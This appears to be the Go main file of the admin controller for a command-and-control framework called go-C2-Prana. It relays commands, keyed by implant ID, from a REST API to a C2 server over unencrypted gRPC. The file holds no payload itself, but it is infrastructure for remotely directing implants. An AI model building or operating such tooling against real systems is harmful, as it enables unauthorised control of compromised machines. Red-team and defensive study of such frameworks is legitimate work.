package main

import (
	"context"
	"github.dev/nireitdev/go-C2-Prana/admin/api"
	"github.dev/nireitdev/go-C2-Prana/internal/Task"
	proto2 "github.dev/nireitdev/go-C2-Prana/internal/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"log"
)

func main() {

	TaskList := Task.NewTaskList()
	chanTask := make(chan Task.Task)
	exit := make(chan bool)

	//Start GRPC coneccion
	log.Println("Connectando con el servidor...")
	opts := grpc.DialOption(grpc.WithTransportCredentials(insecure.NewCredentials()))
	conn, err := grpc.NewClient("localhost:3000", opts)
	if err != nil {
		log.Fatalln("Imposible conectar con el servidor. Bye!")
	}
	defer conn.Close()
	srv := proto2.NewServerClient(conn)

	//Start Api REST
	go func() {
		server := api.NewApiRest("0.0.0.0:8080")
		server.Run(context.Background(), chanTask)
	}()

	//Wait for new tasks and send to Server
	go func() {
		for task := range chanTask {
			TaskList.Tasks[task.TaskID] = task
			taskreq := proto2.TaskRequest{
				TaskID:    task.TaskID,
				ImplantID: task.ImplantID,
				Command:   task.Command,
			}
			var taskresult *proto2.TaskResult
			taskresult, err = srv.AdminTask(context.Background(), &taskreq)
			if err != nil {
				log.Fatalf("Imposible conectarse con el Server. Error: %v \n", err)
			}
			if taskresult.Status == proto2.TaskStatus_NEWTASKOK {
				log.Printf("Nuevo task agregado exitosamente. Task: %v \n", taskresult)
			}
		}
	}()

	<-exit
}
